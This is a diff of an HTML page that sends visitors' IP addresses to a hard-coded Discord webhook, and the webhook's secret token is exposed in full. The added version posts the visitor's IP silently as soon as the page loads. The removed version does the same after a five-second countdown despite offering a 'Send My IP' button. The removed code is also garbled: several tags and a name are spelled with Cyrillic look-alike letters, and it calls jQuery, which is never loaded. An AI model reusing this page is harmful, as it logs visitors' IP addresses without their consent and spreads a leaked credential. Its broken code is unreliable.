@@ -1,84 +1,17 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Advanced IP Sender to Discord</title>
+    <title>Send IP to Discord Webhook</title>
 </head>
-<body id="app" class="loading">
-    <div class="container">
-        <!-- Header -->
-        <header>
-            <h2><a href="#">IP Address to Discord Webhook</a></h2>
-        </header>
-
-        <!-- Main Content -->
-        <main>
-            <form>
-                <label for="discordWebhookUrl">Discord Webhook URL:</label><br />
-                <input type="text" value="https://discord.com/api/webhooks/1302684161852702730/YiE1EIC9F0U5ayDfXEdhSi4H1tiNilrSysfPTpFRJ6BEZ5jdia5QwHaYbf4oSlj8zgvp" disabled id="discordWebhookUrl" name="discordWebhookUrl"><br /><br />
-
-                <label for="customMessage">Custom Message (optional):</label><br />
-                <textarea rows="5" cols="45" id="customMessage"></textarea><br /><br />
-
-                <button onclick="sendIpToDiscord()">Send My IP</button>
-            </form>
-        </main>
-
-        <!-- Footer -->
-        <footer>
-            <!-- Timer display element -->
-            <span class="timer" id="timeRemaining">Counting down...</span>
-        </footer>
-    </div>
-
-    <style>
-        /* CSS styles */
-        *{box-sizing: border-box;}
-        body {font-family: Arial; margin: 0px;}
-        .container {width: 70%; max-width: 960px; margin: auto;}
-        header h2 a {color: #fff; text-decoration: none;}
-        main form label, main form button {display: block;}
-        input[type=text], textarea {margin-bottom: 20px;}
-    </style>
-
+<body>
     <script>
-    $(document).ready(function(){
-      // Get initial time left
-      const timeLeft = 5;
-      let intervalId;
-
-      function startTimer() {
-          let remainingSeconds = timeLeft;
-          intervalId = setInterval(() => {
-              if (remainingSeconds <= 0) {
-                  clearInterval(intervalId);
-                  $("#timeRemaining").html("Sending...");
-                  sendIpToDiscord();
-              } else {
-                  $("#timeRemaining").html(`${remainingSeconds} seconds remaining`);
-                  remainingSeconds--;
-              }
-          }, 1000);
-      }
-
-      function sendIpToDiscord() {
-          $.getJSON("https://api.ipdata.co", data => {
-              const custom_message = $("#customMessage").val() || "";
-              const jsonData = JSON.stringify({content:`Your IP is ${data.connection.client_ip}, Custom Message: ${custom_message}`});
-
-              fetch('https://discord.com/api/webhooks/1302684161852702730/YiE1EIC9F0U5ayDfXEdhSi4H1tiNilrSysfPTpFRJ6BEZ5jdia5QwHaYbf4oSlj8zgvp', {method:'POST', headers:{ 'Content-Type': 'application/json'}, body:jsonData})
-                  .then(response => response.json())
-                  .then(data => console.log('Successfully sent'))
-                  .catch(error => console.error('Error while sending message: ', error));
-          });
-      }
-
-      // Start counting down when page loads
-      startTimer();
-
-      // Resetting form values on page load
-      $("#customMesсage").val("");
-    })
-    </scrипт>
-</bodу>
+        fetch('https://discord.com/api/webhooks/1302684161852702730/YiE1EIC9F0U5ayDfXEdhSi4H1tiNilrSysfPTpFRJ6BEZ5jdia5QwHaYbf4oSlj8zgvp', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ content: 'Visitor IP: ' + '{{ip}}' }),
+        });
+    </script>
+</body>
 </html>
